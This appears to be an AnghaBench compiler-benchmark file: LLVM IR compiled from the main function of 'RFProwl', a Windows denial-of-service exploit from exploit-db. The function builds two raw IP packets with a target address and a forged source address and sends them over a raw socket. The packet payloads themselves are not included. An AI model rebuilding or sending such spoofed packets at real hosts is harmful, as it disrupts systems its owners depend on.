; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19940.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19940.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [40 x i8] c"RFProwl - rain forest puppy / wiretrip\0A\00", align 1
@.str.1 = private unnamed_addr constant [57 x i8] c"Usage: RFProwl <profiled IP/destination> <src IP(fake)>\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@pack1 = common dso_local global i64 0, align 8
@pack2 = common dso_local global i64 0, align 8
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [18 x i8] c"Socket problems: \00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"Write_ip #1 choked\0A\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"Write_ip #2 choked\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"Packets sent\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 3
  br i1 %12, label %13, label %17

13:                                               ; preds = %2
  %14 = call i32 @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* @EXIT_FAILURE, align 4
  %16 = call i32 @exit(i32 %15) #3
  unreachable

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @inet_addr(i8* %20)
  store i32 %21, i32* %9, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @inet_addr(i8* %24)
  store i32 %25, i32* %8, align 4
  %26 = load i64, i64* @pack1, align 8
  %27 = add nsw i64 %26, 16
  %28 = call i32 @memcpy(i64 %27, i32* %9, i32 4)
  %29 = load i64, i64* @pack2, align 8
  %30 = add nsw i64 %29, 16
  %31 = call i32 @memcpy(i64 %30, i32* %9, i32 4)
  %32 = load i64, i64* @pack1, align 8
  %33 = add nsw i64 %32, 12
  %34 = call i32 @memcpy(i64 %33, i32* %8, i32 4)
  %35 = load i64, i64* @pack1, align 8
  %36 = add nsw i64 %35, 12
  %37 = call i32 @memcpy(i64 %36, i32* %8, i32 4)
  %38 = load i32, i32* @IPPROTO_RAW, align 4
  %39 = call i32 @open_raw_sock(i32 %38)
  store i32 %39, i32* %6, align 4
  %40 = load i32, i32* %6, align 4
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %46

42:                                               ; preds = %17
  %43 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.2, i64 0, i64 0))
  %44 = load i32, i32* @EXIT_FAILURE, align 4
  %45 = call i32 @exit(i32 %44) #3
  unreachable

46:                                               ; preds = %17
  %47 = load i32, i32* %6, align 4
  %48 = load i64, i64* @pack1, align 8
  %49 = call i32 @write_ip(i32 %47, i64 %48, i32 46)
  store i32 %49, i32* %7, align 4
  %50 = load i32, i32* %7, align 4
  %51 = icmp slt i32 %50, 46
  br i1 %51, label %52, label %54

52:                                               ; preds = %46
  %53 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  br label %54

54:                                               ; preds = %52, %46
  %55 = load i32, i32* %6, align 4
  %56 = load i64, i64* @pack2, align 8
  %57 = call i32 @write_ip(i32 %55, i64 %56, i32 46)
  store i32 %57, i32* %7, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %58, 46
  br i1 %59, label %60, label %62

60:                                               ; preds = %54
  %61 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  br label %62

62:                                               ; preds = %60, %54
  %63 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  %64 = load i32, i32* %7, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %68

66:                                               ; preds = %62
  %67 = load i32, i32* @EXIT_FAILURE, align 4
  br label %70

68:                                               ; preds = %62
  %69 = load i32, i32* @EXIT_SUCCESS, align 4
  br label %70

70:                                               ; preds = %68, %66
  %71 = phi i32 [ %67, %66 ], [ %69, %68 ]
  ret i32 %71
}

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @memcpy(i64, i32*, i32) #1

declare dso_local i32 @open_raw_sock(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write_ip(i32, i64, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
